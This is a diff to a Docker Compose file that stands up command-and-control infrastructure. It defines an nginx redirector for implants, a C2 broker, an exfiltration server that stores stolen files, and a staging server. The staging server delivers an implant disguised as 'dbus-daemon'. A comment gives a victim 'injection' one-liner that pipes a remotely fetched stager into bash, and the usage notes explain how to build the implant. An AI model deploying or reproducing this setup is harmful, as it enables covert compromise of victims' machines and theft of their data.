@@ -1,37 +1,117 @@
 version: "3.9"
 
+# Usage:
+#   export OPERATOR_TOKEN=mysecrettoken
+#   export STAGING_HOST=<your VM LAN IP>
+#   mkdir -p logs exfil
+#   docker compose up --build
+#
+# Pre-requisite: build the implant binary once in WSL/Linux:
+#   pyinstaller --onefile --noupx --name dbus-daemon \
+#       --hidden-import ssl --hidden-import _ssl --collect-all cryptography \
+#       implant_client.py
+#   cp dist/dbus-daemon staging/dbus-daemon
+#   cp stager.sh staging/stager.sh
+
+x-token: &token ${OPERATOR_TOKEN:-changeme}
+
 services:
 
+  # nginx TCP proxy - implants connect here on :443, proxied to c2-server internally
+  redirector:
+    image: nginx:1.25-alpine
+    container_name: redirector
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+    ports:
+      - "443:443"
+    depends_on:
+      - c2-server
+    networks:
+      - c2net
+    restart: unless-stopped
+
+  # C2 broker - TLS implant listener on :9999, operator API on localhost:9998
   c2-server:
-    build: .
+    build:
+      context: .
+      dockerfile: Dockerfile
     container_name: c2-server
     command: python c2_server.py
     environment:
-      OPERATOR_TOKEN: ${OPERATOR_TOKEN:-changeme}
+      OPERATOR_TOKEN: *token
       C2_LOG: /app/logs/c2.log
     ports:
-      - "9999:9999"
-      - "9998:9998"
+      - "127.0.0.1:9998:9998"
     volumes:
       - ./logs:/app/logs
+    networks:
+      - c2net
     restart: unless-stopped
 
+  # Receives exfil'd files via HTTP POST, saves to ./exfil/
   exfil-server:
-    build: .
+    build:
+      context: .
+      dockerfile: Dockerfile
     container_name: exfil-server
     command: python exfil_server.py
     ports:
       - "9090:9090"
     volumes:
       - ./exfil:/app/exfil
+    networks:
+      - c2net
     restart: unless-stopped
 
+  # HTTPS staging server - serves pre-built binary + stager on :8443
+  # /s = stager.sh with STAGING_HOST substituted, /b = dbus-daemon binary
+  # Victim injection: curl -fsSLk https://<STAGING_HOST>:8443/s | bash
   staging-server:
-    image: python:3.11-slim
+    build:
+      context: .
+      dockerfile: Dockerfile
     container_name: staging-server
-    working_dir: /app
+    command: python staging_server.py
+    environment:
+      STAGING_HOST: ${STAGING_HOST:-127.0.0.1}
+      STAGING_DIR: /srv
+      STAGING_PORT: "8443"
+      EXFIL_DIR: /app/exfil
     volumes:
-      - .:/app:ro
-    command: python -m http.server 8080
+      - ./staging:/srv:ro
+      - ./exfil:/app/exfil
     ports:
-      - "8080:8080"
+      - "8443:8443"
+    networks:
+      - c2net
+
+  # Uncomment to simulate an implant locally for testing
+  # implant-sim:
+  #   build:
+  #     context: .
+  #     dockerfile: Dockerfile
+  #   container_name: implant-sim
+  #   command: python implant_client.py
+  #   environment:
+  #     C2_HOST: redirector
+  #     C2_PORT: "9999"
+  #     EXFIL_HOST: exfil-server
+  #     EXFIL_PORT: "9090"
+  #   depends_on:
+  #     - redirector
+  #     - exfil-server
+  #   networks:
+  #     - c2net
+
+networks:
+  c2net:
+    driver: bridge
+
+volumes:
+  logs:
+    driver: local
+    driver_opts:
+      type: none
+      o: bind
+      device: ${PWD}/logs
